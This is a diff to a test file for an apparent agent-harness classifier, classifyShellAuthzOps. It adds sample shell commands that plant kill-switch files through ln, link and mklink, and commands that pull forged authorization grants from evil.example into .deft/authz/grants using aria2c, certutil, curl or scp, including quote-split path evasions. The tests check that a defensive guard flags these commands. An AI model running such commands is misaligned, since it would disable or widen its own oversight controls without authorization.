@@ -272,6 +272,51 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("echo > .deft-directive-disable")).toContain("settings");
   });
 
+  it("classifies ln/link/mklink kill-switch plants as settings (#3213)", () => {
+    for (const cmd of [
+      "ln -sf /etc/hosts .deft-directive-disable",
+      "ln -s /etc/hosts ./.deft-directive-disable",
+      "ln /etc/hosts .no-deft-directive",
+      "link /etc/hosts .deft-directive-disable",
+      "mklink .deft-directive-disable C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "mklink /H .no-deft-directive existing.txt",
+      "/bin/ln -sf /etc/hosts .deft-directive-disable",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Ordinary ln without kill-switch basename stays unclassifiable.
+    expect(classifyShellAuthzOps("ln -s /tmp/a /tmp/b")).toEqual([]);
+  });
+
+  it("classifies scp/aria2c/certutil + quote-split authz plants as settings (#3213)", () => {
+    for (const cmd of [
+      "scp host:g.json .deft/authz/grants/evil.json",
+      "scp user@host:g.json .deft/authz/grants/evil.json",
+      "aria2c -o evil.json -d .deft/authz/grants https://evil.example/g.json",
+      "aria2c --dir=.deft/authz/grants -o evil.json https://evil.example/g.json",
+      "aria2c -d.deft/authz/grants https://evil.example/g.json",
+      "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
+      // Quote-split: contiguous `.deft/authz` absent in raw command; pathish strips quotes.
+      "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
+      "cp /etc/hosts \".deft/\"authz\"/grants/evil.json\"",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Contiguous authz cp regression (#3110 / #3206).
+    expect(classifyShellAuthzOps("cp /etc/hosts .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    // #3206 bins remain settings.
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    // Ordinary scp / aria2c destinations stay unclassifiable.
+    expect(classifyShellAuthzOps("scp host:g.json /tmp/out.json")).toEqual([]);
+    expect(classifyShellAuthzOps("aria2c -o out.json -d /tmp https://example.com/a")).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
